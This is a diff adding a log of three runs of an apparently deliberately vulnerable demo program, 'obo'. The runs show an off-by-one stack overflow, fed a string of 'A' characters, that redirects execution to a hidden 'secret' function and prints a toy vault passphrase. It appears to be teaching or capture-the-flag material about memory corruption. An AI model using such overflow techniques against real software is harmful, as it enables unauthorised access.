@@ -1,0 +1,133 @@
+./obo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA -d
+
+[+] Address of function "secret":	0x804857a
+[+] Stack before vulnerable instrucion:
+	0xb75e4c50
+	0xb76fb4e0
+	0x8048828
+	0xbfa6db24
+	0xb76faff4
+	0xbfa6db28
+	0x804860c
+	0xbfa6e6c5
+	0x804857a
+	0xbfa6dba8
+	0xb75b1e46
+	0x3
+	0xbfa6dbd4
+	0xbfa6dbe4
+	0xb771c860
+	0xb7735821
+
+[+] Stack after copying AAAAAAAAAAAA onto the stack:
+	0xc
+	0x41414141
+	0x41414141
+	0x41414141
+	0xbfa6db00
+	0x804860c
+	0xbfa6e6c5
+	0x804857a
+	0xbfa6dba8
+	0xb75b1e46
+	0x3
+	0xbfa6dbd4
+	0xbfa6dbe4
+	0xb771c860
+	0xb7735821
+	0xffffffff
+
+
+	Incorrect Password.
+
+Segmentation fault
+./obo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA -d
+
+[+] Address of function "secret":	0x804857a
+[+] Stack before vulnerable instrucion:
+	0xb7638c50
+	0xb774f4e0
+	0x8048828
+	0xbfb913f4
+	0xb774eff4
+	0xbfb913f8
+	0x804860c
+	0xbfb916c5
+	0x804857a
+	0xbfb91478
+	0xb7605e46
+	0x3
+	0xbfb914a4
+	0xbfb914b4
+	0xb7770860
+	0xb7789821
+
+[+] Stack after copying AAAAAAAAAAAA onto the stack:
+	0xc
+	0x41414141
+	0x41414141
+	0x41414141
+	0xbfb91300
+	0x804860c
+	0xbfb916c5
+	0x804857a
+	0xbfb91478
+	0xb7605e46
+	0x3
+	0xbfb914a4
+	0xbfb914b4
+	0xb7770860
+	0xb7789821
+	0xffffffff
+
+
+	Incorrect Password.
+
+Segmentation fault
+./obo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA -d
+
+[+] Address of function "secret":	0x804857a
+[+] Stack before vulnerable instrucion:
+	0xb7622c50
+	0xb77394e0
+	0x8048828
+	0xbfa8af04
+	0xb7738ff4
+	0xbfa8af08
+	0x804860c
+	0xbfa8b6c5
+	0x804857a
+	0xbfa8af88
+	0xb75efe46
+	0x3
+	0xbfa8afb4
+	0xbfa8afc4
+	0xb775a860
+	0xb7773821
+
+[+] Stack after copying AAAAAAAAAAAA onto the stack:
+	0xc
+	0x41414141
+	0x41414141
+	0x41414141
+	0xbfa8af00
+	0x804860c
+	0xbfa8b6c5
+	0x804857a
+	0xbfa8af88
+	0xb75efe46
+	0x3
+	0xbfa8afb4
+	0xbfa8afc4
+	0xb775a860
+	0xb7773821
+	0xffffffff
+
+
+	Incorrect Password.
+
+
+[*] Secret passphrase for the money vault = "0p3n5354m3.1337"
+
+[!] ARGH, I've been hacked!
+
